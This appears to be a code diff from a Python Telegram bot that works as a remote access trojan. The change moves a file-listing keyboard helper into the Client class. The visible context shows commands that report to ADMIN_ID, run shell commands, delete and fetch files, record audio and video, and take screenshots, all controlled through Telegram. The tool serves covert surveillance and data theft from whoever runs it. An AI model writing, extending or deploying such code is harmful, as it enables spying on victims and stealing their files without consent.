@@ -33,15 +33,6 @@ def checkID(ms):
         bot.send_message(ADMIN_ID, info)
         return False
 
-def create_markup():
-    markup = ReplyKeyboardMarkup()
-    list_files = os.listdir(os.getcwd())
-    for i in list_files:
-        markup.add(i)
-
-    markup.add("EXIT")
-    return markup
-
 
 """ Functional """
 class Client:
@@ -59,12 +50,21 @@ class Client:
         self.filename_audio = "recorded_audio.wav"
         self.filename_video = "video1.avi"
 
+    def create_markup(self):
+        markup = ReplyKeyboardMarkup()
+        list_files = os.listdir(os.getcwd())
+        for i in list_files:
+            markup.add(i)
+
+        markup.add("EXIT")
+        return markup
+
     def check_command(self, ms):
         if ms.text == "cd":
             bot.send_message(ADMIN_ID, os.getcwd(), reply_markup=markup)
 
         elif ms.text == "chdir":
-            markup_chdir = create_markup()
+            markup_chdir = self.create_markup()
             markup_chdir.add("..")
             bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_chdir)
             
@@ -92,7 +92,7 @@ class Client:
                 bot.send_message(ADMIN_ID, f"Error:\n{e}")
 
         elif ms.text == "rm_file":
-            markup_rm = create_markup()
+            markup_rm = self.create_markup()
             bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_rm)
 
             @bot.message_handler(content_types=["text"])
@@ -131,7 +131,7 @@ class Client:
             bot.register_next_step_handler(ms, exec_cmd_next)
 
         elif ms.text == "get_file":
-            markup_get_file = create_markup()
+            markup_get_file = self.create_markup()
             bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_get_file)
             
             @bot.message_handler(content_types=["text"])
@@ -229,7 +229,7 @@ class Client:
                     video.write(frame)
 
         elif ms.text == "get_video":
-            markup_video = create_markup()
+            markup_video = self.create_markup()
             bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_video)
 
             @bot.message_handler(content_types=["text"])
@@ -367,10 +367,10 @@ markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("record_video"), KeyboardButton("get_video"),
         KeyboardButton("get_screen"))
 
-
 """ Start """
 client = Client()
 bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
+
 
 @bot.message_handler(commands=["_start"])
 def send_welcome(ms):
@@ -384,5 +384,6 @@ def CheckCommand(ms):
             client.check_command(ms)
         except Exception as e:
             bot.send_message(ADMIN_ID, e)
+
 
 bot.infinity_polling()
